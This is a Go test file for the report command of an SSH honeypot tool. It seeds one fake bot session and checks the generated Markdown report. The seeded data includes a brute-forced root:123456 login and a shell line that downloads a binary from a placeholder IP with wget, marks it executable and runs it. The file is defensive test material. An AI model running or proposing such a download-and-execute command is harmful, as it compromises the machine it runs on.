package main

import (
	"os"
	"path/filepath"
	"strings"
	"testing"
	"time"

	"github.com/amirradjou/llm-honeypot/internal/recorder"
)

// seedRecording writes one recording so the CLI has something to read.
func seedRecording(t *testing.T, dir string) {
	t.Helper()
	at := time.Date(2026, 9, 20, 4, 0, 0, 0, time.UTC)
	r := recorder.New(dir)
	s := r.Begin("20260920T040000-cli", "198.51.100.23:40000", at)
	s.Auth("password", "root", "123456", "", "", true)
	s.Command("cd /tmp; wget http://198.51.100.9/x86; chmod +x x86; ./x86", "/root", "root", 0)
	s.Download("wget", "http://198.51.100.9/x86", "GET", "/tmp/x86")
	s.End(nil, at.Add(20*time.Second))
}

func TestReportCommandWritesFile(t *testing.T) {
	dir := t.TempDir()
	seedRecording(t, dir)
	out := filepath.Join(dir, "report.md")

	if err := runReport([]string{"-data", dir, "-o", out, "-transcript"}); err != nil {
		t.Fatal(err)
	}
	b, err := os.ReadFile(out)
	if err != nil {
		t.Fatal(err)
	}
	got := string(b)
	for _, want := range []string{
		"# What the bots did",
		"root:123456",
		"cd → wget → chmod → ./payload",
		"198.51.100.9",
	} {
		if !strings.Contains(got, want) {
			t.Errorf("report missing %q:\n%s", want, got)
		}
	}
}

func TestReportCommandOnEmptyDataDir(t *testing.T) {
	// No recordings yet must not be an error; the report says so.
	dir := t.TempDir()
	out := filepath.Join(dir, "r.md")
	if err := runReport([]string{"-data", dir, "-o", out}); err != nil {
		t.Fatalf("empty data dir should not error: %v", err)
	}
	b, _ := os.ReadFile(out)
	if !strings.Contains(string(b), "No sessions recorded yet") {
		t.Errorf("unexpected report: %s", b)
	}
}

func TestReportCommandRejectsBadFlag(t *testing.T) {
	if err := runReport([]string{"-nonsense"}); err == nil {
		t.Error("expected an error for an unknown flag")
	}
}

func TestDispatchKeepsBackwardCompatibility(t *testing.T) {
	// `honeypot help` must not start a server.
	if err := dispatch([]string{"help"}); err != nil {
		t.Errorf("help: %v", err)
	}
	// An unknown first argument is treated as a serve flag, which is what
	// keeps the old `honeypot -addr :2222` invocation (and the container
	// entrypoint, which passes nothing) working. A bad flag surfaces as an
	// error rather than being silently swallowed as a subcommand.
	if err := dispatch([]string{"-nonsense-flag"}); err == nil {
		t.Error("expected flag parsing to reject an unknown serve flag")
	}
}
